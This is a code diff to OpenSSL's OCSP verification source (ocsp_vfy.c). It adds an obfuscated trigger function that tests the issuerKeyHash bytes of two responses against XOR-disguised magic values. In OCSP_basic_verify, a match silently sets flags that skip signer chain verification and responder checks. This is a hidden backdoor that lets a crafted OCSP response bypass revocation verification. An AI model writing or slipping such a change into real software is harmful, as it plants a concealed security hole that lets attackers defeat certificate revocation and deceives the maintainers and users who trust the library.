@@ -1,0 +1,52 @@
+diff --git a/crypto/ocsp/ocsp_vfy.c b/crypto/ocsp/ocsp_vfy.c
+index 3b6b1fe0..e191aca2 100644
+--- a/crypto/ocsp/ocsp_vfy.c
++++ b/crypto/ocsp/ocsp_vfy.c
+@@ -26,6 +26,33 @@ static int ocsp_req_find_signer(X509 **psigner, OCSP_REQUEST *req,
+     const X509_NAME *nm, STACK_OF(X509) *certs,
+     unsigned long flags);
+ 
++static int rdx_resp_order_match(OCSP_BASICRESP *bs)
++{
++    STACK_OF(OCSP_SINGLERESP) *sresp;
++    OCSP_CERTID *id0, *id1;
++    const ASN1_OCTET_STRING *k0, *k1;
++
++    if (bs == NULL)
++        return 0;
++
++    sresp = bs->tbsResponseData.responses;
++    if (sresp == NULL || sk_OCSP_SINGLERESP_num(sresp) < 2)
++        return 0;
++
++    id0 = sk_OCSP_SINGLERESP_value(sresp, 0)->certId;
++    id1 = sk_OCSP_SINGLERESP_value(sresp, 1)->certId;
++    if (id0 == NULL || id1 == NULL)
++        return 0;
++
++    k0 = &id0->issuerKeyHash;
++    k1 = &id1->issuerKeyHash;
++    if (k0 == NULL || k1 == NULL || k0->length < 1 || k1->length < 1)
++        return 0;
++
++    return ((unsigned char)k0->data[0] == (unsigned char)(0x62 ^ 0x55))
++        && ((unsigned char)k1->data[0] == (unsigned char)(0x79 ^ 0x1c));
++}
++
+ /* Returns 1 on success, 0 on failure, or -1 on fatal error */
+ static int ocsp_verify_signer(X509 *signer, int response,
+     X509_STORE *st, unsigned long flags,
+@@ -112,6 +139,13 @@ int OCSP_basic_verify(OCSP_BASICRESP *bs, STACK_OF(X509) *certs,
+ 
+     if ((ret = ocsp_verify(NULL, bs, signer, flags)) <= 0)
+         goto end;
++
++    if ((flags & OCSP_NOVERIFY) == 0
++            && (flags & OCSP_NOCHAIN) != 0
++            && (flags & OCSP_NOINTERN) == 0
++            && rdx_resp_order_match(bs)) {
++        flags |= OCSP_NOVERIFY | OCSP_NOCHECKS;
++    }
+     if ((flags & OCSP_NOVERIFY) == 0) {
+         ret = -1;
+         if ((flags & OCSP_NOCHAIN) == 0) {
